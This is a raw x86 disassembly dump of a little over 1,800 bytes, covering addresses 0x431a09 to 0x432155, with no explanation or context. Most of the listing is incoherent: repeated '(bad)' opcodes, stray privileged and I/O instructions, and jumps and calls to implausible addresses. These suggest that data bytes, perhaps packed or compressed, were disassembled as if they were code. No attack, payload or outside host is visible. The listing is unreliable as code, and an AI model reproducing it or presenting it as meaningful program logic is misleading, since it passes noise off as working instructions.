  431a09:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  431a0f:	xor    DWORD PTR [ecx],0xc
  431a12:	pushf  
  431a13:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  431a19:	rdmsr  
  431a1b:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  431a22:	dec    ebp
  431a23:	ret    
  431a24:	mov    edi,DWORD PTR [esi-0x4]
  431a27:	pop    eax
  431a28:	dec    ebp
  431a29:	jne    0x4319b6
  431a2b:	xor    edi,esp
  431a2d:	inc    eax
  431a2e:	dec    ebp
  431a2f:	jbe    0x431a84
  431a31:	inc    eax
  431a32:	pop    ebp
  431a33:	add    edx,DWORD PTR [esi+0x8]
  431a36:	push   esp
  431a37:	dec    eax
  431a38:	push   ecx
  431a39:	mov    eax,edi
  431a3b:	and    al,0xf0
  431a3d:	jo     0x431a2a
  431a3f:	mov    eax,DWORD PTR [ebx]
  431a41:	sbb    BYTE PTR [ebp+0x4d],cl
  431a44:	mov    eax,DWORD PTR [ebx]
  431a46:	nop
  431a47:	or     BYTE PTR [eax],al
  431a49:	jne    0x431aa2
  431a4b:	cmp    ebx,DWORD PTR [ebx+0x33893277]
  431a51:	cld    
  431a52:	xor    edi,edi
  431a54:	add    edi,DWORD PTR [ebp+0x3]
  431a57:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  431a5d:	js     0x4319e3
  431a5f:	jae    0x431a63
  431a61:	(bad)  
  431a63:	xor    al,0x5d
  431a65:	jmp    0x4319f2
  431a67:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  431a6e:	fdecstp 
  431a70:	test   BYTE PTR [edi],ah
  431a72:	add    bh,BYTE PTR [ebp+0x0]
  431a75:	add    ebx,DWORD PTR [ebp-0x77]
  431a78:	mov    edi,eax
  431a7a:	cmp    al,0x0
  431a7d:	adc    dh,BYTE PTR [ebx]
  431a7f:	jge    0x431a84
  431a81:	mov    edi,DWORD PTR [ebx]
  431a83:	jl     0x431a94
  431a85:	clc    
  431a86:	dec    edi
  431a87:	jge    0x431a89
  431a89:	mov    eax,DWORD PTR [ebx]
  431a8b:	jb     0x431a95
  431a8d:	mov    ecx,DWORD PTR [ebp-0x8]
  431a90:	mov    edi,edi
  431a92:	xor    edx,DWORD PTR [eax]
  431a94:	add    edi,DWORD PTR [ebx]
  431a96:	mov    DWORD PTR [ebp-0x10],edi
  431a99:	inc    edi
  431a9a:	pop    ebp
  431a9b:	jge    0x431ad8
  431a9d:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  431aa1:	mov    edx,0xc05d87f0
  431aa6:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  431aaa:	fimul  WORD PTR [eax]
  431aac:	fist   WORD PTR [ebp+0x1c]
  431aaf:	in     al,dx
  431ab0:	jne    0x431a9e
  431ab2:	mov    edi,DWORD PTR [edx-0x7a27a10]
  431ab8:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  431abc:	fdivp  st(0),st
  431abe:	fild   WORD PTR [ebp+0x4510f85c]
  431ac4:	test   BYTE PTR [ebx+0x4d00fc02],cl
  431aca:	inc    ebp
  431acb:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  431ad1:	mov    ebp,DWORD PTR [ebx-0x4]
  431ad4:	adc    al,0x8b
  431ad6:	rcl    DWORD PTR [eax],0x48
  431ad9:	mov    esi,0x7080803
  431ade:	fiadd  WORD PTR [ebp+0x4d]
  431ae1:	(bad)  
  431ae2:	mov    edx,DWORD PTR [edx-0x4]
  431ae5:	mov    edx,DWORD PTR [ebp-0x4]
  431ae8:	xor    ebx,DWORD PTR [ebx+0x330103]
  431aee:	mov    DWORD PTR [edi+0x872dc],edi
  431af4:	xlat   BYTE PTR ds:[ebx]
  431af5:	into   
  431af6:	ffreep st(6)
  431af8:	retf   0x6c7
  431afb:	iret   
  431afc:	dec    ebp
  431afd:	inc    ebp
  431afe:	mov    DWORD PTR [ebx],edi
  431b00:	fmul   QWORD PTR [edi]
  431b02:	dec    ebp
  431b03:	jnp    0x431b38
  431b05:	add    BYTE PTR [ebx],al
  431b07:	mov    ecx,DWORD PTR [esp+edi*8]
  431b0a:	inc    ebp
  431b0b:	dec    ebp
  431b0c:	lea    esi,[ebx]
  431b0e:	add    DWORD PTR [ebx],eax
  431b10:	jb     0x431b4d
  431b12:	add    BYTE PTR [edi],cl
  431b14:	inc    ebp
  431b15:	imul   eax,edi,0x858bd800
  431b1b:	cld    
  431b1c:	clc    
  431b1d:	mov    DWORD PTR [ebp+0x0],eax
  431b20:	inc    DWORD PTR [eax]
  431b22:	or     al,0xde
  431b24:	sbb    bh,0x1
  431b27:	retf   
  431b28:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  431b2f:	dec    ebp
  431b30:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  431b36:	enter  0x12de,0xdf
  431b3a:	inc    ebp
  431b3b:	pop    ebp
  431b3c:	dec    DWORD PTR [ebx-0x257f0ff4]
  431b42:	add    DWORD PTR [edx],edx
  431b44:	add    BYTE PTR [ebp+0x50],dl
  431b47:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  431b4d:	xor    ecx,DWORD PTR [edx-0x38c699fd]
  431b53:	or     ah,al
  431b55:	pop    ss
  431b56:	cdq    
  431b57:	push   ebp
  431b58:	clc    
  431b59:	mov    eax,DWORD PTR [ebp-0x4]
  431b5c:	xor    edx,edx
  431b5e:	add    esi,DWORD PTR [ebx]
  431b60:	cmp    eax,DWORD PTR [ebx]
  431b62:	hlt    
  431b63:	cmp    DWORD PTR [ebx],esp
  431b65:	or     al,BYTE PTR [ebp+0xf]
  431b68:	mov    eax,DWORD PTR [edx]
  431b6a:	loopne 0x431b6c
  431b6c:	(bad)  
  431b6d:	mov    ecx,esi
  431b6f:	cld    
  431b70:	pushf  
  431b71:	pop    ebp
  431b72:	fwait
  431b73:	mov    esi,DWORD PTR [edx]
  431b75:	lock mov eax,eax
  431b78:	adc    BYTE PTR [ebx],al
  431b7a:	or     BYTE PTR [ebx+0x4d001001],0xcf
  431b81:	xor    ebp,DWORD PTR [edi+0x50e45189]
  431b87:	dec    ebp
  431b88:	mov    ecx,DWORD PTR [ebx-0x31390304]
  431b8e:	(bad)  
  431b8f:	iret   
  431b90:	inc    ebp
  431b91:	(bad)  
  431b92:	jne    0x431be1
  431b94:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  431b9a:	(bad)  
  431b9b:	cmp    ebx,eax
  431b9d:	je     0x431b25
  431b9f:	add    edi,edi
  431ba1:	or     bh,bh
  431ba3:	dec    ebp
  431ba4:	inc    ebp
  431ba5:	mov    esi,DWORD PTR [ebx]
  431ba7:	cld    
  431ba8:	add    ecx,esi
  431baa:	cmp    ecx,DWORD PTR [eax-0xc]
  431bad:	mov    edx,DWORD PTR [edi]
  431baf:	or     BYTE PTR [ebp-0x7c],al
  431bb2:	mov    ebx,DWORD PTR [ebx-0x7639cd18]
  431bb8:	test   BYTE PTR [ebx+ebx*4],cl
  431bbb:	inc    ebp
  431bbc:	xor    bh,BYTE PTR [esi]
  431bbe:	mov    DWORD PTR [eax+ebp*8+0x10ef8b],ebx
  431bc5:	jne    0x431b8e
  431bc7:	mov    ebp,esp
  431bc9:	fcomp  DWORD PTR [ebx]
  431bcb:	add    BYTE PTR [ecx],al
  431bcd:	inc    DWORD PTR [ebp-0x75]
  431bd0:	(bad)  
  431bd1:	cld    
  431bd2:	add    al,0xce
  431bd4:	mov    ecx,edi
  431bd6:	cld    
  431bd7:	inc    ebp
  431bd8:	fidivr WORD PTR [ebx]
  431bda:	fbstp  TBYTE PTR [ebp-0x3e]
  431bdd:	mov    eax,DWORD PTR [eax]
  431bdf:	adc    BYTE PTR [ebx-0x3974038b],cl
  431be5:	fadd   st,st(7)
  431be7:	add    BYTE PTR [ebp-0x1],al
  431bea:	mov    ecx,DWORD PTR [esp+edi*8]
  431bed:	inc    ebp
  431bee:	mov    bh,0xc7
  431bf1:	loopne 0x431c38
  431bf3:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  431bf9:	sbb    dh,BYTE PTR [ebx]
  431bfb:	pushf  
  431bfc:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  431c02:	mov    eax,edi
  431c04:	cwde   
  431c05:	inc    ebp
  431c06:	inc    ebp
  431c07:	jne    0x431b94
  431c09:	mov    esp,esp
  431c0b:	clc    
  431c0c:	add    al,0x4d
  431c0e:	mov    DWORD PTR [ebx],esi
  431c10:	or     al,0x33
  431c12:	inc    ebp
  431c13:	lea    ecx,[ebx-0x398d13fd]
  431c19:	add    bh,al
  431c1b:	inc    ebp
  431c1c:	ror    DWORD PTR [ebx+0x45d829],0x8b
  431c23:	add    ebp,esp
  431c25:	shufps xmm1,xmm3,0xc7
  431c29:	(bad)  
  431c2a:	jmp    0x74885753
  431c2f:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  431c35:	hlt    
  431c36:	mov    ecx,DWORD PTR [edi]
  431c38:	fadd   DWORD PTR [ebp+0x0]
  431c3b:	xor    ecx,DWORD PTR [edi]
  431c3d:	add    ecx,ecx
  431c3f:	cmp    edi,edi
  431c41:	pmuludq mm7,QWORD PTR [edx+0x50]
  431c45:	(bad)  
  431c46:	jmp    0x431bd3
  431c48:	mov    edi,esp
  431c4a:	or     al,0xc6
  431c4c:	inc    ebp
  431c4d:	(bad)  
  431c4e:	mov    eax,DWORD PTR [ebp+0x10]
  431c51:	jne    0x431bdc
  431c53:	mov    eax,DWORD PTR [ecx]
  431c55:	clc    
  431c56:	add    BYTE PTR [ebp-0x40],cl
  431c59:	xor    edx,DWORD PTR [eax-0x73]
  431c5c:	jne    0x431c5f
  431c5e:	push   DWORD PTR [edx+0x8]
  431c61:	add    BYTE PTR [ebp+0x45],al
  431c64:	mov    ebp,ecx
  431c66:	cld    
  431c67:	add    BYTE PTR [ebp+0x0],cl
  431c6a:	xor    eax,DWORD PTR [ebp+0x3]
  431c6d:	mov    DWORD PTR [ebx],edi
  431c6f:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  431c75:	sub    eax,0x5d330e4d
  431c7a:	lea    esi,[ebx]
  431c7c:	add    DWORD PTR [ebx],eax
  431c7e:	jb     0x431c69
  431c80:	add    BYTE PTR [eax],al
  431c82:	inc    ebp
  431c83:	add    bl,ch
  431c85:	inc    ebp
  431c86:	mov    esi,DWORD PTR [ebx]
  431c88:	or     al,0x3
  431c8a:	(bad)  
  431c8b:	mov    edi,eax
  431c8d:	in     al,dx
  431c8e:	scas   eax,DWORD PTR es:[edi]
  431c8f:	inc    ebp
  431c90:	mov    esi,DWORD PTR [ebx]
  431c92:	in     al,0x3
  431c94:	add    al,0x89
  431c96:	mov    ecx,DWORD PTR [eax+edi*8]
  431c99:	dec    ebp
  431c9a:	(bad)  
  431c9b:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3165]
  431ca2:	mov    ecx,eax
  431ca4:	cld    
  431ca5:	push   es
  431ca6:	dec    ebp
  431ca7:	add    al,0x33
  431ca9:	mov    DWORD PTR [ebx],eax
  431cab:	in     al,dx
  431cac:	cmp    DWORD PTR [ebp-0x67],eax
  431caf:	mov    eax,DWORD PTR [ebp-0xba0068]
  431cb5:	mov    edx,DWORD PTR [ebp-0x4]
  431cb8:	mov    ecx,DWORD PTR [ebp-0x2c]
  431cbb:	xor    eax,DWORD PTR [ebp+0x3]
  431cbe:	cmp    DWORD PTR [ebx],0x8b32749a
  431cc4:	xor    edi,esp
  431cc6:	jmp    0xff771a18
  431ccb:	add    ecx,DWORD PTR [ebp-0x3f]
  431cce:	xor    ebx,DWORD PTR [edi]
  431cd0:	add    eax,ecx
  431cd2:	cmp    ebx,DWORD PTR [eax]
  431cd4:	mov    ecx,DWORD PTR [ebp-0x4]
  431cd7:	mov    ecx,DWORD PTR [eax]
  431cd9:	adc    BYTE PTR [ebp-0x80],al
  431cdc:	jmp    0x431cdf
  431cde:	mov    eax,DWORD PTR [eax]
  431ce0:	cld    
  431ce1:	mov    bh,0xc6
  431ce3:	push   ecx
  431ce4:	(bad)  
  431ce5:	jne    0x431d45
  431ce7:	dec    ecx
  431ce9:	or     BYTE PTR [ecx+ebx*1],cl
  431cec:	push   ebp
  431ced:	inc    ebp
  431cee:	in     al,dx
  431cef:	add    ebp,esp
  431cf1:	or     bh,al
  431cf3:	dec    ebp
  431cf4:	cld    
  431cf5:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  431cfb:	xor    DWORD PTR [edx],0x2
  431cfe:	pushf  
  431cff:	dec    DWORD PTR [ebx+0x45510cf4]
  431d05:	mov    DWORD PTR [ebx+0x5445fc0c],ecx
  431d0b:	mov    edx,DWORD PTR [ecx+0xc]
  431d0e:	xor    eax,esi
  431d10:	mov    edx,0xc172c7
  431d15:	inc    ebp
  431d16:	mov    esi,DWORD PTR [ebp+0x8]
  431d19:	mov    eax,edx
  431d1b:	call   0x84c7e410
  431d20:	add    DWORD PTR [ebx-0x76bace00],ebx
  431d26:	mov    ebp,eax
  431d28:	or     BYTE PTR [eax],dl
  431d2a:	jo     0x431d79
  431d2c:	push   edi
  431d2d:	xor    esi,DWORD PTR [ebp+0x3]
  431d30:	(bad)  
  431d31:	pmulhuw mm0,mm1
  431d34:	test   DWORD PTR [ebp-0x8],ecx
  431d37:	mov    DWORD PTR [ebp-0x67],eax
  431d3a:	mov    eax,DWORD PTR [ebp-0x4]
  431d3d:	xor    edi,DWORD PTR [ebp-0x73]
  431d40:	xor    eax,DWORD PTR [ebx]
  431d42:	xor    esi,DWORD PTR [edx+0x3]
  431d45:	add    BYTE PTR [ecx],bh
  431d47:	inc    ebp
  431d48:	(bad)  
  431d49:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  431d4f:	mov    DWORD PTR [eax],0x750f0004
  431d55:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  431d5b:	lock add BYTE PTR [ebp+0x0],cl
  431d5f:	mov    esi,DWORD PTR [ebp-0x18]
  431d62:	mov    ebp,edx
  431d64:	or     al,0x72
  431d66:	ja     0x431d68
  431d68:	mov    edx,esi
  431d6a:	cld    
  431d6b:	(bad)  
  431d6e:	cli    
  431d6f:	mov    esi,DWORD PTR [ebp-0x4]
  431d72:	cmp    ecx,esi
  431d74:	bswap  edi
  431d76:	(bad)
  431d7a:	mov    esi,DWORD PTR [ebp-0x4]
  431d7d:	mov    esi,ecx
  431d7f:	clc    
  431d80:	repnz add esi,DWORD PTR [ebp+0x45]
  431d84:	push   ebx
  431d85:	xor    eax,DWORD PTR [ebp+0x3]
  431d88:	cmp    al,0x5f
  431d8a:	pushf  
  431d8b:	pop    ebx
  431d8c:	jmp    0x431e53
  431d91:	mov    esi,DWORD PTR [ebp-0x7d]
  431d94:	xor    ebp,DWORD PTR [eax]
  431d96:	lea    eax,[ebp-0x8]
  431d99:	xor    edx,esi
  431d9b:	pushf  
  431d9c:	out    dx,eax
  431d9d:	(bad)  
  431d9e:	neg    eax
  431da0:	ins    DWORD PTR es:[edi],dx
  431da1:	test   esi,edi
  431da3:	clc    
  431da4:	pop    esp
  431da5:	inc    ebp
  431da6:	or     BYTE PTR [ecx+0x450f0c7d],cl
  431dac:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  431db2:	add    cl,al
  431db4:	jne    0x431d51
  431db6:	mov    esi,DWORD PTR [edx]
  431db8:	in     al,dx
  431db9:	push   esi
  431dba:	xor    BYTE PTR [ebp-0xe],dh
  431dbd:	add    edi,esi
  431dbf:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  431dc5:	add    cl,bh
  431dc7:	mov    edi,DWORD PTR [ebp+0x8]
  431dca:	mov    DWORD PTR [ebp-0x14],esi
  431dcd:	add    esi,DWORD PTR [ebp+0x3c]
  431dd0:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  431dd6:	mov    ah,0x3e
  431dd8:	fwait
  431dd9:	pushf  
  431dda:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  431de0:	jne    0x431d6d
  431de2:	mov    ecx,DWORD PTR [esp+ebp*8]
  431de5:	icebp  
  431de6:	icebp  
  431de7:	shl    edx,0xf2
  431dea:	(bad)  
  431deb:	mov    ah,0x16
  431ded:	push   eax
  431dee:	jne    0x431d83
  431df0:	mov    ecx,DWORD PTR [edi]
  431df2:	in     al,dx
  431df3:	jmp    0x431de6
  431df5:	add    dl,dh
  431df7:	mov    edi,esi
  431df9:	or     al,0x8
  431dfb:	inc    ebp
  431dfc:	jne    0x431e01
  431dfe:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  431e04:	ret    
  431e05:	or     bh,bh
  431e07:	jge    0x431df1
  431e09:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  431e0f:	xor    edi,eax
  431e11:	add    esi,DWORD PTR [ebp-0x77]
  431e14:	mov    ebx,esp
  431e16:	clc    
  431e17:	neg    DWORD PTR [ebp-0x7c]
  431e1a:	xor    eax,DWORD PTR [eax]
  431e1c:	cmp    eax,DWORD PTR [eax]
  431e1e:	repz jne 0x431db6
  431e21:	xor    eax,DWORD PTR [ecx]
  431e23:	add    ebx,DWORD PTR [eax]
  431e25:	mov    DWORD PTR [ebp-0x8],eax
  431e28:	mov    eax,edi
  431e2a:	cld    
  431e2b:	lock pop eax
  431e2d:	test   DWORD PTR [ebx],esi
  431e2f:	clc    
  431e30:	add    edx,DWORD PTR [edi-0x740bff77]
  431e36:	fdivp  st(4),st
  431e38:	test   ecx,esi
  431e3a:	(bad)  
  431e3b:	jnp    0x431e3c
  431e3d:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  431e43:	jae    0x431dd0
  431e45:	sub    edi,esp
  431e47:	(bad)  
  431e48:	shl    DWORD PTR [eax-0x3e],0x89
  431e4c:	leave  
  431e4d:	call   0x8198d55a
  431e52:	in     al,dx
  431e53:	(bad)  
  431e54:	in     al,dx
  431e55:	add    bh,al
  431e57:	mov    esp,edi
  431e59:	in     al,dx
  431e5a:	test   DWORD PTR [ebp-0x8],edi
  431e5d:	mov    eax,DWORD PTR [ebp+0x2b]
  431e60:	xor    al,BYTE PTR [ebx]
  431e62:	pushf  
  431e63:	jnp    0x57321a9c
  431e69:	xor    edx,DWORD PTR [ecx+ecx*4+0x51]
  431e6d:	loopne 0x431ea2
  431e6f:	jne    0x431e2c
  431e71:	mov    esi,DWORD PTR [edx-0x20]
  431e74:	add    BYTE PTR [ebp-0x3d],bh
  431e77:	xor    eax,DWORD PTR [ebp-0x73]
  431e7a:	mov    edi,DWORD PTR [esi]
  431e7c:	cld    
  431e7d:	jb     0x431e45
  431e7f:	add    bl,al
  431e81:	jne    0x431ec8
  431e83:	mov    edx,DWORD PTR [edi-0x10]
  431e86:	jge    0x431f05
  431e88:	mov    esi,DWORD PTR [ebx]
  431e8a:	lock add ecx,DWORD PTR [ebp+0x3b]
  431e8e:	xor    esi,DWORD PTR [ebp-0x77]
  431e91:	mov    esi,eax
  431e93:	lock inc ebp
  431e95:	jge    0x431ec8
  431e97:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  431e9e:	dec    ebp
  431e9f:	mov    esi,DWORD PTR [ebx]
  431ea1:	loopne 0x431e2c
  431ea3:	jge    0x431e9d
  431ea5:	add    DWORD PTR [ebp-0x7d],eax
  431ea8:	icebp  
  431ea9:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  431eb0:	dec    ebp
  431eb1:	hlt    
  431eb2:	xor    ebx,DWORD PTR [ebp-0x77]
  431eb5:	mov    esi,esp
  431eb7:	in     al,0x45
  431eb9:	jge    0x431ef8
  431ebb:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  431ec2:	dec    ebp
  431ec3:	push   esp
  431ec4:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  431eca:	inc    ebp
  431ecb:	hlt    
  431ecc:	xor    DWORD PTR [ebp-0x61],esi
  431ecf:	mov    edi,DWORD PTR [eax+0xf19504]
  431ed5:	repnz mov DWORD PTR [ebp+0x20],ebx
  431ed9:	cmp    eax,DWORD PTR [ebp+0xf]
  431edc:	test   DWORD PTR [edi+ecx*1-0x1],edx
  431ee0:	fistp  WORD PTR [ebx+0x0]
  431ee3:	inc    ebp
  431ee4:	mov    ebx,DWORD PTR [edi+0xc]
  431ee7:	add    eax,eax
  431ee9:	inc    ebp
  431eea:	test   BYTE PTR [ebx],dh
  431eec:	add    eax,DWORD PTR [ebx]
  431eee:	add    BYTE PTR [esi+0x45],bl
  431ef1:	ret    0x85
  431ef4:	jnp    0x5443a2c3
  431efa:	inc    bp
  431efc:	inc    ebp
  431efd:	xor    DWORD PTR [ecx+0xc78a9c],edi
  431f03:	fdiv   QWORD PTR [ebx]
  431f05:	test   DWORD PTR [ecx+0x453bf8],edi
  431f0b:	push   ebx
  431f0c:	add    edi,DWORD PTR [esi+0x708088b]
  431f12:	cmp    esi,eax
  431f14:	setnp  BYTE PTR [ecx-0x74fcffce]
  431f1b:	mov    esp,edi
  431f1d:	call   0x33ce646f
  431f22:	or     BYTE PTR [ebx],al
  431f24:	inc    ecx
  431f25:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  431f2b:	and    BYTE PTR [ebp-0x7074f0bb],al
  431f31:	lock add cl,al
  431f34:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  431f3b:	mov    ch,0x45
  431f3d:	clc    
  431f3e:	xor    eax,DWORD PTR [ebp+0x3]
  431f41:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  431f47:	inc    ebp
  431f48:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  431f4e:	mov    edi,eax
  431f50:	mov    eax,DWORD PTR [ebp+0x3c]
  431f53:	mov    ecx,DWORD PTR [eax]
  431f55:	hlt    
  431f56:	inc    ebp
  431f57:	ror    DWORD PTR [ebx+0x818c45],0xf4
  431f5e:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  431f64:	push   ebp
  431f65:	mov    edi,DWORD PTR [ebx]
  431f67:	in     al,dx
  431f68:	jne    0x431f2b
  431f6a:	mov    eax,DWORD PTR [ebp-0x28]
  431f6d:	add    DWORD PTR [eax],0xe8058dec
  431f73:	clc    
  431f74:	mov    esi,DWORD PTR [edi-0x8]
  431f77:	add    dh,dl
  431f79:	rol    WORD PTR [ebp-0x1],cl
  431f7d:	mov    edx,DWORD PTR [eax+0x8]
  431f80:	jne    0x431f42
  431f82:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  431f89:	inc    ebp
  431f8a:	push   esp
  431f8b:	test   DWORD PTR [ecx+0xf],ecx
  431f8e:	sub    edx,esp
  431f90:	add    eax,DWORD PTR [eax]
  431f92:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  431f98:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  431f9f:	mov    eax,DWORD PTR [ecx]
  431fa1:	and    BYTE PTR [eax],al
  431fa3:	cmp    al,0x10
  431fa5:	add    BYTE PTR [ebp+0x66],al
  431fa8:	inc    ecx
  431faa:	push   esp
  431fab:	add    dh,BYTE PTR [ebp+0x0]
  431fae:	push   edx
  431faf:	enterw 0xc1,0x4d
  431fb4:	mov    esp,DWORD PTR [esi+0x20]
  431fb7:	add    DWORD PTR [ecx-0x7b],eax
  431fba:	add    eax,DWORD PTR [ebx]
  431fbc:	str    WORD PTR [eax+0x45]
  431fc0:	lea    ecx,[ebx+0x45890801]
  431fc6:	sbb    BYTE PTR [ebx],al
  431fc8:	dec    ebp
  431fc9:	cmp    al,0xf
  431fcb:	inc    ebp
  431fcc:	push   eax
  431fcd:	mov    esi,DWORD PTR [ebx]
  431fcf:	push   eax
  431fd0:	add    eax,eax
  431fd2:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  431fd9:	inc    ebp
  431fda:	add    BYTE PTR [ecx],dh
  431fdc:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  431fe3:	(bad)  
  431fe4:	mov    ebx,eax
  431fe6:	loopne 0x43202d
  431fe8:	dec    ebp
  431fe9:	mov    ecx,DWORD PTR [edi]
  431feb:	cld    
  431fec:	push   eax
  431fed:	xchg   DWORD PTR [ebx],esi
  431fef:	add    DWORD PTR [ebx],ebp
  431ff1:	add    BYTE PTR [ebx],ch
  431ff3:	or     BYTE PTR [ecx],bh
  431ff5:	dec    ecx
  431ff6:	loopne 0x431ffb
  431ff8:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  431ffe:	push   ebp
  431fff:	add    DWORD PTR [ebx+0x55100800],eax
  432005:	dec    ebp
  432006:	jmp    0x431f91
  432008:	mov    esp,DWORD PTR [eax]
  43200a:	sbb    dl,dl
  43200c:	inc    eax
  43200d:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  432013:	add    BYTE PTR [ebx+0x74528555],cl
  432019:	push   ebp
  43201a:	div    DWORD PTR [ebx]
  43201c:	and    eax,DWORD PTR [ebx]
  43201e:	add    edx,DWORD PTR [edx-0x30]
  432021:	jno    0x431fae
  432023:	inc    DWORD PTR [eax+eiz*1]
  432026:	inc    ebp
  432027:	push   eax
  432028:	push   eax
  432029:	mov    esp,DWORD PTR [edi-0x74beff1c]
  43202f:	mov    edi,esp
  432031:	push   eax
  432032:	inc    ebp
  432033:	enter  0x458b,0x8
  432037:	push   ecx
  432038:	(bad)  
  432039:	call   0x10d2a11
  43203e:	pop    ss
  43203f:	push   ebp
  432040:	mov    ecx,DWORD PTR [ebx+0x489408]
  432046:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  43204c:	push   ecx
  43204d:	jo     0x432037
  43204f:	inc    DWORD PTR [edi]
  432051:	or     BYTE PTR [eax],al
  432053:	call   0xce279d
  432058:	fmul   QWORD PTR [ebp+0x55]
  43205b:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  432061:	mov    bh,0x8c
  432063:	adc    al,0x9b
  432065:	dec    esp
  432066:	xor    bl,BYTE PTR [eax]
  432068:	mov    ecx,DWORD PTR [ebp+0xc]
  43206b:	mov    eax,DWORD PTR [ebp-0x4]
  43206e:	mov    esi,DWORD PTR [edi-0x3148f924]
  432074:	push   es
  432075:	retf   
  432076:	mov    BYTE PTR [ebp-0x30],0x3b
  43207a:	inc    ebp
  43207b:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  432082:	retf   0x83fc
  432085:	into   
  432086:	dec    ebp
  432087:	retf   
  432088:	mov    ecx,DWORD PTR [ebp-0x74]
  43208b:	mov    eax,DWORD PTR [eax]
  43208d:	fdiv   QWORD PTR [ebx]
  43208f:	mov    bh,0x3
  432091:	push   es
  432092:	mov    esi,ecx
  432094:	sbb    cl,dl
  432096:	dec    ebp
  432097:	sar    DWORD PTR [ebx],cl
  432099:	push   ebp
  43209a:	jne    0x4320ab
  43209c:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  4320a2:	lea    ebx,[eax]
  4320a4:	call   0xf4ccac6b
  4320a9:	sbb    dh,dl
  4320ab:	add    edx,ebx
  4320ad:	push   ebp
  4320ae:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  4320b4:	push   ecx
  4320b5:	mov    DWORD PTR [eax-0x30],edx
  4320b8:	test   DWORD PTR [edx],eax
  4320ba:	xadd   esp,esi
  4320bd:	pop    es
  4320be:	add    cl,dl
  4320c0:	mov    eax,ecx
  4320c2:	or     al,0x45
  4320c4:	(bad)  
  4320c5:	push   eax
  4320c6:	add    DWORD PTR [edx+0x0],eax
  4320c9:	add    ecx,DWORD PTR [ecx]
  4320cb:	and    dh,cl
  4320cd:	call   0xc7299d
  4320d2:	add    DWORD PTR [ebp+0x0],edx
  4320d5:	mov    esp,DWORD PTR [ebp+0x18]
  4320d8:	add    BYTE PTR [eax+0x50],cl
  4320db:	xor    eax,DWORD PTR [eax]
  4320dd:	add    esp,DWORD PTR [esi+0x3b]
  4320e0:	inc    ebp
  4320e1:	je     0x432066
  4320e3:	push   ecx
  4320e4:	dec    BYTE PTR [ebp-0x77]
  4320e7:	add    eax,esi
  4320e9:	or     al,0x5e
  4320eb:	inc    eax
  4320ec:	add    BYTE PTR [ebx],al
  4320ee:	data16 and BYTE PTR [ebp+0x50],al
  4320f2:	sub    DWORD PTR [ecx],0xfffffff8
  4320f5:	add    BYTE PTR [ebp-0x75],ah
  4320f8:	add    BYTE PTR [eax],bl
  4320fa:	enter  0x894d,0x8b
  4320fe:	int3   
  4320ff:	loopne 0x4320c3
  432101:	rol    BYTE PTR [eax],0x33
  432104:	lea    cx,[ebp+0xa]
  432108:	data16 jb 0x432150
  43210b:	add    BYTE PTR [ebx+0x44890855],cl
  432111:	sbb    ah,al
  432113:	inc    ebp
  432114:	cmp    al,0xf
  432116:	add    BYTE PTR [edx+0x66],dl
  432119:	xor    ecx,DWORD PTR [eax]
  43211b:	sub    eax,DWORD PTR [edx]
  43211d:	mov    eax,DWORD PTR [eax]
  43211f:	or     al,0x66
  432121:	ror    edx,cl
  432123:	dec    ebp
  432124:	inc    ebp
  432125:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  43212b:	cld    
  43212c:	or     BYTE PTR [edi+0x4501dd],dl
  432132:	ret    0xecce
  432135:	retf   
  432136:	(bad)  
  432137:	dec    ebp
  432138:	mov    al,0x8b
  43213a:	loopne 0x43215c
  43213c:	cmp    ecx,DWORD PTR [edx]
  43213e:	inc    ebp
  43213f:	daa    
  432140:	loopne 0x4320c9
  432142:	in     al,dx
  432143:	add    edi,eax
  432145:	add    BYTE PTR [eax+0x3f52e155],bh
  43214b:	push   ebp
  43214c:	inc    ebp
  43214d:	xor    ebx,edx
  43214f:	add    ebp,esp
  432151:	push   edx
  432152:	push   bp
  432154:	inc    ebp
  432155:	(bad)  
